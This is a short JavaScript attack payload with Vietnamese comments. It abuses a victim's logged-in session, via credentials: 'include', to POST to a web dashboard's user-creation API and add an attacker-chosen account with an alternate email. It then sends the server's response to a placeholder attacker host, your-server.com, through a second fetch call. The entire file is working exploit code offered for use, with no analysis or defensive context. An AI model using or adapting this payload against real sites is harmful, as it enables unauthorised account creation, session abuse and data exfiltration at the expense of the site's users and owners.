// payload.js

// Dữ liệu user muốn tạo
var data = {
  isGuest: false,
  firstName: "Mose",
  lastName: "Adolph",
  userPrincipalName: "a1@abc.com",
  displayName: "Mose Adolph",
  alternateEmailAddresses: ["fato5@3dboxer.com"]
};

// Gửi request POST tạo user mới
fetch("https://alume.com/en-us/dashboard/account/v3/api/users", {
  method: "POST",
  credentials: "include", // Đảm bảo gửi cookie phiên của nạn nhân
  headers: {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*"
    // Có thể bổ sung các header khác nếu cần thiết
  },
  body: JSON.stringify(data)
})
.then(response => response.text())
.then(result => {
  // Gửi kết quả về server của bạn để kiểm tra (tùy chọn)
  fetch("https://your-server.com/000?result=" + encodeURIComponent(result));
});
